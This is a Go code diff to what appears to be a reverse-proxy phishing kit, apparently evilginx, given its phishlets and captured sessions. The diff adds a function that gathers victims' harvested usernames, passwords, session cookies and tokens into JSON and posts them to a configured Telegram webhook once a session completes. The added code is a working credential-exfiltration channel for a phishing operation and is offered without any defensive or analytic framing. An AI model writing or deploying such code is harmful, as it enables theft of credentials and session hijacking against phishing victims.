@@ -15,6 +15,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"html"
 	"io"
@@ -861,6 +862,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.IsDone = true
+
+						// Send captured data to Telegram webhook
+						p.sendToTelegramWebhook(s, pl.Name, ps.Index)
 					}
 				}
 			}
@@ -1030,6 +1034,50 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
 
 	return p, nil
+}
+
+func (p *HttpProxy) sendToTelegramWebhook(session *Session, phishletName string, index int) {
+	webhookURL := p.cfg.general.WebhookTelegram
+	if webhookURL == "" {
+		return
+	}
+
+	// Prepare the data to send
+	data := map[string]interface{}{
+		"session_id":   session.Id,
+		"phishlet":     phishletName,
+		"index":        index,
+		"username":     session.Username,
+		"password":     session.Password,
+		"custom":       session.Custom,
+		"cookies":      session.CookieTokens,
+		"body_tokens":  session.BodyTokens,
+		"http_tokens":  session.HttpTokens,
+		"timestamp":    time.Now().Format(time.RFC3339),
+	}
+
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		log.Error("telegram: failed to marshal session data: %v", err)
+		return
+	}
+
+	// Send to Telegram webhook
+	go func() {
+		resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
+		if err != nil {
+			log.Error("telegram: failed to send webhook: %v", err)
+			return
+		}
+		defer resp.Body.Close()
+
+		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
+			body, _ := ioutil.ReadAll(resp.Body)
+			log.Error("telegram: webhook returned status %d: %s", resp.StatusCode, string(body))
+		} else {
+			log.Success("telegram: session data sent to webhook")
+		}
+	}()
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
